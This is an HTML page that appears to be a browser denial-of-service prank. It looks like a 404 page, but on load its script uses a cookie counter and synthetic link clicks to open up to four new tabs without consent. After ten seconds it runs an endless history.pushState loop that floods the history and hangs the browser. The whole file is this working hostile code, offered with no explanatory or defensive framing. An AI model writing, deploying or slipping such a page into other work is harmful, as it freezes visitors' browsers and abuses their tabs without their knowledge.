<!DOCTYPE html>
<html>
    <head>
        <title>yoyo</title>
        <meta charset="utf-8">
    </head>
    <body>
        <a id='link' href='./test.html' target='_blank'>下一层</a>
        </br>
        <img src="images/img/404/404.jpg">

        <script>
        onload = function(){ 
            var tab_count = Number(document.cookie.split('c=')[1].split(';')[0]);
            tab_count = tab_count || 0;
            if(tab_count > 4){
                tab_count = 0;
            }
            tab_count++;
            document.title = '页面' + tab_count;
            document.cookie = 'c=' + tab_count;
            console.log('当前是第'+tab_count+'个窗口')
            if(tab_count < 4) {
                console.log('打开新标签！')
                // window.open('./test.html')
                var a = document.getElementById('link');
                var e = document.createEvent('MouseEvents');
                e.initEvent( 'click', true, true );
                a.dispatchEvent(e);
            }
//             while(true){
//                 var tab_count = Number(document.cookie.split('c=')[1].split(';')[0]);
//                 console.log('已打开'+tab_count+'个窗口')
//                 if(tab_count >= 4){
//                     console.log('开始！')
//                     break;
//                 }
//             }
            setTimeout(() => {
                var fa = "";
                for(var i=0;true;i++){
                    fa = i.toString();
                    console.log(fa);
                    history.pushState(0,0,fa);
                }
            },10000)
        }
        
        </script>
    </body>
</html>
